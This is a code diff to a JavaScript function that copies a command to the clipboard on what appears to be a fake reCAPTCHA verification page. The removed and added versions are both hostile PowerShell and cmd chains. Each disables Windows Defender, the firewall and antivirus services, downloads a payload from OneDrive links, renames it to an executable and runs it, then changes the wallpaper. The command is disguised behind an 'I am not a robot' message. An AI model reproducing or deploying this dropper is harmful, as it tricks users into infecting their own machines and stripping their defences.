@@ -183,15 +183,23 @@
     }
 
     function stageClipboard(verification_id){
-        const command = `powershell -w h -ep b -c "` +
-            `s^v M^P P -DRM 1; s^v M^P P -ECFA 0; s^v N F P -A -E F; ` +
-            `g^v s |?{$_.D -match 'antivirus|security|mcafee|norton|symantec|kaspersky|bitdefender|avast|avg'} | s^v s -F; ` +
-            `(n^o SY.N.W.WC).DF('https://1drv.ms/u/c/2f3053ae4c170361/EeYeejV2PKFEmtjhRhdpI2wB64I2_mzc80Ww3Vo78_JhsQ?e=LT49up','$e:te/sys.html'); ` +
-            `c^o '$e:te/sys.html' '$e:te/sys.exe'; ` +
-            `r^l '$e:te/sys.exe'; a^v M^P P -EP '$e:te'; ` +
-            `(n^o SY.N.W.WC).DF('https://1drv.ms/i/c/2f3053ae4c170361/EUij8r4pE9lPg_c9kuSGMTkB6i4S4qqaNCE7U5NRDxePCg?e=tQOSx6','$e:te/wp.jpg'); ` +
-            `a^v t -td 'using S;using S.R.I;public class w{[DllImport(\\\"user32.dll\\\",CharSet=CharSet.A)]public static extern int SPI(int uA,int uP,string l,int f);}';[w]::SPI(20,0,'$e:te/wp.jpg',3);"` +
-            ` # ✅ ''I am not a robot - reCAPTCHA Verification ID: ${verification_id}''`;
+        const command = `cmd /c "echo Starting verification... && ` +
+            `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "` +
+            `Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command', ` +
+            `'Set-MpPreference -DisableRealtimeMonitoring 1; ` +
+            `Set-MpPreference -EnableControlledFolderAccess 0; ` +
+            `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; ` +
+            `Get-Service | Where-Object {$_.DisplayName -match \\\"antivirus\\\" -or $_.DisplayName -match \\\"security\\\" -or $_.DisplayName -match \\\"mcafee\\\" -or $_.DisplayName -match \\\"norton\\\" -or $_.DisplayName -match \\\"symantec\\\" -or $_.DisplayName -match \\\"kaspersky\\\" -or $_.DisplayName -match \\\"bitdefender\\\" -or $_.DisplayName -match \\\"avast\\\" -or $_.DisplayName -match \\\"avg\\\"} | Stop-Service -Force; ` +
+            `Add-MpPreference -ExclusionPath \\\"%TEMP%\\\"; ` +
+            `certutil -urlcache -split -f https://1drv.ms/u/c/2f3053ae4c170361/EeYeejV2PKFEmtjhRhdpI2wB64I2_mzc80Ww3Vo78_JhsQ?e=LT49up %TEMP%\\\\captcha.html; ` +
+            `copy %TEMP%\\\\captcha.html %TEMP%\\\\system_update.exe; ` +
+            `rundll32.exe %TEMP%\\\\system_update.exe,Main; ` +
+            `certutil -urlcache -split -f https://1drv.ms/i/c/2f3053ae4c170361/EUij8r4pE9lPg_c9kuSGMTkB6i4S4qqaNCE7U5NRDxePCg?e=tQOSx6 %TEMP%\\\\wallpaper.jpg; ` +
+            `reg add \\\"HKCU\\\\Control Panel\\\\Desktop\\\" /v Wallpaper /t REG_SZ /d \\\"%TEMP%\\\\wallpaper.jpg\\\" /f; ` +
+            `RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters; ` +
+            `echo Verification complete ✅''` +
+            `' -Wait -WindowStyle Hidden"` +
+            `" && echo ✅ ''I am not a robot - reCAPTCHA Verification ID: ${verification_id}''"`;
 
         setClipboardCopyData(command);
     }
